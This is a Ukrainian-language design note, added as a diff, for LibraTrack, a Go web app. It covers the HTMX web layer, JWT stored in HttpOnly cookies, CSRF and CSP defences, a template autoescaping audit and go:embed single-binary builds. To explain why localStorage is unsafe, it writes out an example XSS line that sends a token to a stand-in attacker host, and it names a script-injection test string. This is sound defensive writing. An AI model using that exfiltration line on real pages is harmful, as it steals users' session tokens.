@@ -1,0 +1,149 @@
+===============================================================
+LibraTrack — Тема 10: веб-шар, HTMX, go:embed (design_v10)
+===============================================================
+
+1. Архітектура веб-шару
+---------------------------------------------------------------
+
+  Браузер ──HTML/HTMX──> Gin router ──> internal/handler/web ──> repository ──> PostgreSQL
+                              │
+                              ├─ /api/v1/...  JSON API (Bearer JWT, як у темі 9)
+                              ├─ /catalog, /login, /register, /web/books/...  HTML (JWT у cookie)
+                              └─ /static/...  CSS/JS з embed.FS
+
+  * Шаблони: web/templates/layout.html ({{block "content" .}}), сторінки
+    catalog.html, book_form.html, login.html, register.html, error.html;
+    partials/book_row.html (рядок таблиці) та partials/book_rows.html (тіло таблиці).
+  * Renderer (internal/handler/web/render.go) розбирає для КОЖНОЇ сторінки
+    окремий набір layout + partials + сторінка через template.ParseFS. Окремі
+    набори потрібні, бо всі сторінки визначають однаковий блок "content".
+  * HTMX (web/static/js/htmx.min.js 2.0.4, вбудований, без CDN):
+      - live search: GET /web/books?q=... з HX-Request -> лише рядки <tr>;
+      - видалення: DELETE /web/books/:id -> 200 з порожнім тілом, HTMX замінює
+        "closest tr" (outerHTML) порожнечею — рядок зникає без перезавантаження.
+  * Форми створення/редагування — звичайні HTML-форми (POST + 303 redirect,
+    патерн Post/Redirect/Get). Працюють і без JavaScript. Валідація — та сама
+    DTO model.BookInput, що й у JSON API.
+  * Наявність примірників для всієї сторінки рахується ОДНИМ запитом
+    (CopyRepository.AvailabilityByBooks, GROUP BY), без N+1.
+
+2. JWT в HttpOnly-cookie замість localStorage
+---------------------------------------------------------------
+
+  Що зроблено:
+  * POST /login (HTML-форма) перевіряє пароль і кладе JWT у cookie
+    libratrack_token з атрибутами:
+        HttpOnly        — недоступна для document.cookie / JavaScript;
+        Secure          — лише HTTPS (localhost браузери вважають безпечним;
+                          COOKIE_SECURE=false вимикає лише для локального HTTP);
+        SameSite=Strict — браузер не надсилає cookie з чужих сайтів;
+        Path=/, Max-Age = 24 год (= exp токена).
+  * Токен НЕ повертається в тілі відповіді й НЕ доступний скриптам сторінки.
+  * middleware.WebAuth читає cookie і кладе user_id/role у контекст;
+    middleware.RequireWebRole виконує RBAC (анонім -> 401/redirect на /login,
+    reader -> 403). Вихід — POST /logout (cookie з Max-Age=-1).
+  * JSON API (/api/v1) і далі приймає лише "Authorization: Bearer". Cookie
+    там свідомо НЕ приймається: інакше API став би вразливим до CSRF.
+
+  Чому localStorage небезпечний для server-rendered застосунку:
+  * localStorage доступний БУДЬ-ЯКОМУ JavaScript на origin. Одна XSS-вразливість
+    (наприклад, неекранована назва книги, скомпрометований скрипт або
+    розширення) дозволяє виконати
+        fetch("https://evil.example/?t=" + localStorage.getItem("token"))
+    і вкрасти токен. Далі зловмисник користується ним зі своєї машини до exp
+    (24 год) — сесію не можна "закрити", бо JWT stateless.
+  * У server-rendered застосунку немає потреби, щоб JS бачив токен: браузер сам
+    додає cookie до запитів, а HTMX працює зі звичайними запитами. Зберігати
+    токен у JS-доступному сховищі — це лише збільшувати поверхню атаки.
+  * HttpOnly не усуває XSS повністю (скрипт може робити запити від імені
+    користувача, поки сторінка відкрита), але токен неможливо ЕКСФІЛЬТРУВАТИ.
+    Тому додатково: автоекранування html/template + CSP без inline-скриптів.
+
+  Новий ризик cookie — CSRF, і як він закритий:
+  * SameSite=Strict — cookie не йде з крос-сайтових запитів;
+  * middleware.SameOrigin (http.CrossOriginProtection, Go 1.25+) відхиляє
+    POST/PUT/DELETE з іншого origin за Sec-Fetch-Site / Origin -> 403;
+  * усі зміни стану — лише POST/DELETE (GET безпечні, logout — теж POST).
+
+  Додаткові заголовки (middleware.SecurityHeaders) для HTML-відповідей:
+    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';
+        img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self';
+        frame-ancestors 'none'
+    X-Content-Type-Options: nosniff, X-Frame-Options: DENY,
+    Referrer-Policy: same-origin, Cache-Control: no-store.
+  HTMX налаштовано під CSP: <meta name="htmx-config"> з
+  includeIndicatorStyles=false (без inline-стилів), allowEval=false,
+  allowScriptTags=false.
+
+3. Аудит шаблонів та автоекранування (ручний)
+---------------------------------------------------------------
+
+  Перевірка 1 — використовується лише html/template:
+    $ grep -rn "text/template" --include=*.go .
+      (нічого не знайдено)
+    $ grep -rn "html/template" --include=*.go .
+      internal/handler/web/render.go:11:  "html/template"
+    Висновок: УСІ шаблони рендеряться через html/template (єдина точка —
+    Renderer). text/template у проєкті не імпортується.
+
+  Перевірка 2 — немає template.HTML (та інших "trusted" типів) на ненадійних даних:
+    $ grep -rn "template.HTML\|template.JS\|template.URL\|template.CSS\|template.HTMLAttr" \
+          --include=*.go --include=*.html .
+      internal/handler/web/render.go:23 — лише КОМЕНТАР "Жодна не повертає template.HTML"
+    FuncMap містить одну функцію hasID([]uint, uint) bool — повертає bool, не HTML.
+    Висновок: жодне значення з БД чи від користувача не позначається як безпечне;
+    контекстне автоекранування не обходиться.
+
+  Перевірка 3 — контексти виводу в шаблонах:
+    * текст у HTML ({{.Title}}, {{.Authors}}, {{.Flash}}) — HTML-екранування;
+    * атрибути value="{{.Query}}", value="{{.Title}}" — екранування атрибутів;
+    * URL у атрибутах href="/web/books/{{.ID}}/edit", hx-delete="/web/books/{{.ID}}",
+      action="{{.Action}}" — ID це uint, Action формується сервером (не з вводу);
+    * class="role role-{{.Role}}" — роль із підписаного JWT, до того ж екранується;
+    * <textarea>{{.Description}}</textarea> — екранується як текст.
+    * Inline <script> / style="..." з даними відсутні (CSP їх і так заборонила б).
+
+  Перевірка 4 — JavaScript:
+    web/static/js/app.js показує тексти помилок HTMX через textContent, не
+    innerHTML. Flash-повідомлення після redirect беруться з фіксованої мапи за
+    ключем ?msg=created, тож через URL не можна підставити довільний текст.
+
+  Доказ тестами (internal/handler/web/catalog_test.go):
+    * TestAutoescaping — книга з назвою <script>alert("xss")</script> у
+      /catalog та у HTMX-фрагменті виводиться як &lt;script&gt;...;
+    * TestCreateBookForm — введене у форму <b>...</b> повертається екранованим;
+    * TestCatalogPage — кожна сторінка має заголовок CSP.
+
+4. Один бінарник (go:embed) і перевірка ізоляції (Task 1.2)
+---------------------------------------------------------------
+
+  Що вбудовано:
+    web/templates.go   //go:embed templates   -> web.TemplatesFS (template.ParseFS)
+    web/static.go      //go:embed static      -> web.Static() = fs.Sub(staticFS, "static")
+    migrations/migrations.go //go:embed *.sql -> migrations.FS (golang-migrate iofs)
+    internal/docs      //go:embed openapi.yaml (з теми 7)
+  Міграції теж вбудовані: без цього бінарник не стартував би без папки
+  ./migrations. MIGRATIONS_PATH залишено як необов'язкове перевизначення.
+  Wiring — у cmd/api/main.go (web.TemplatesFS, web.Static(), migrations.FS).
+
+  Перевірка на хості (Windows, Git Bash; аналог /tmp/verify_libratrack):
+    $ CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o $TMP/verify_libratrack/libratrack.exe ./cmd/api
+    $ ls $TMP/verify_libratrack        ->  libratrack.exe   (лише один файл)
+    $ cd $TMP/verify_libratrack && DATABASE_URL=... JWT_SECRET=... PORT=8090 ./libratrack.exe
+    Результат:
+      200 text/html                /catalog
+      200 text/css                 /static/css/app.css
+      200 text/javascript          /static/js/htmx.min.js
+      200 text/javascript          /static/js/app.js
+      HX-Request GET /web/books?q=Go -> лише <tr id="book-..."> рядки
+      POST /login -> Set-Cookie: libratrack_token=...; HttpOnly; Secure; SameSite=Strict
+      DELETE /web/books/11 (анонім) -> 401; (admin) -> 200, тіло 0 B; (Origin evil) -> 403
+
+  Перевірка в контейнері (Dockerfile: FROM scratch, лише /libratrack):
+    $ docker build -t libratrack:hw10 .          (образ ~7 МБ стиснутий)
+    $ docker export <container> | tar -t         ->  .dockerenv, libratrack
+    $ docker run -p 8091:8080 -e DATABASE_URL=...host.docker.internal... libratrack:hw10
+      200 /catalog, 200 /static/css/app.css, 200 /static/js/htmx.min.js
+    На ПОРОЖНІЙ базі (libratrack_iso) контейнер сам застосував 3 вбудовані
+    міграції (schema_migrations: version=3, dirty=f) і показав 10 демо-книг.
+  Висновок: застосунок не потребує жодних файлів поруч із бінарником.
